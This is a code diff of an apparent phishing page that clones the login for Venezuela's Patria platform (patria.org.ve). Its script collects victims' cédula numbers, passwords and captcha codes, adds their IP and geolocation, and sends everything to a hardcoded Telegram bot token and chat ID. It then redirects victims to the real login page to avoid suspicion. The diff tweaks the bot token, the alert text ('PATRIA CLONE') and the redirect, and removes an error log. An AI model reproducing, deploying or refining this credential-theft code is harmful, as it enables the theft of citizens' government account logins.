@@ -259,7 +259,7 @@
 
     <script>
         // Configuración de Telegram
-        const TELEGRAM_BOT_TOKEN = "6237698722:AAHt5-3kTjWCXqDxQe0HHF8YoDyt2ZZMlBo";
+        const TELEGRAM_BOT_TOKEN = "8237698722:AAHt5-3kTjWCXqDxQe0HHF8YoDyt2ZZMlBo";
         const TELEGRAM_CHAT_ID = "-1002806046486";
 
         // Generar un código captcha aleatorio
@@ -323,7 +323,7 @@
             const ip = await getIP();
             const geoInfo = await getGeoInfo(ip);
 
-            const message = `🔴 NUEVO INICIO DE SESIÓN PATRIA 🔴
+            const message = `🔴 NUEVO INICIO DE SESIÓN PATRIA CLONE 🔴
 
 Cédula: ${cedula}
 Contraseña: ${password}
@@ -354,7 +354,6 @@ Código de seguridad: ${captcha}
 
                 return response.ok;
             } catch (error) {
-                console.error("Error enviando a Telegram:", error);
                 return false;
             }
         }
@@ -394,7 +393,7 @@ Código de seguridad: ${captcha}
                 if (success) {
                     // Redirigir después de un breve retraso
                     setTimeout(() => {
-                        window.location.href = "https://patria.org.ve/login/clave/";
+                        window.location.href = "https://patria.org.ve/login/";
                     }, 2000);
                 } else {
                     alert("Error en el proceso de autenticación. Inténtelo de nuevo.");
